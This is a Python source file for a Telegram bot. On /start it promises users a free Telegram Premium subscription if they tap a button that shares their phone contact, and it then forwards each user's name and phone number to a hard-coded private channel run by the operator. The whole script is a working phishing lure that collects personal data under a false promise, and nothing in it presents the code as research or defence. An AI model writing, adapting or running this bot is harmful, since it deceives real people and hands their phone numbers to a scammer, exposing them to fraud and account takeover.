from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
import os

# Token del bot (lo sacas del secreto BOT_TOKEN)
TOKEN = os.getenv("BOT_TOKEN")

# Función que muestra el botón para compartir el número
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton("📱 Compartir mi número", request_contact=True)
    markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "Para Reclamar 🥳 Tu Suscripcion a Telegram Premium Danos tu Numero Toca el Boton ⬇️",
        reply_markup=markup
    )

# Función que recibe el número y lo manda a tu canal
async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if contact:
        channel_id = -1002836094588  # ✅ Tu canal privado
        await context.bot.send_message(
            chat_id=channel_id,
            text=f"📞 Nuevo número recibido:\n👤 Nombre: {contact.first_name} {contact.last_name or ''}\n📱 {contact.phone_number}",
            parse_mode="Markdown"
        )

# Ejecutar el bot
def main():
    print("🦁 Bot online... esperando contactos...")
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, contact))
    app.run_polling()

# Punto de entrada del script
if __name__ == "__main__":
    main()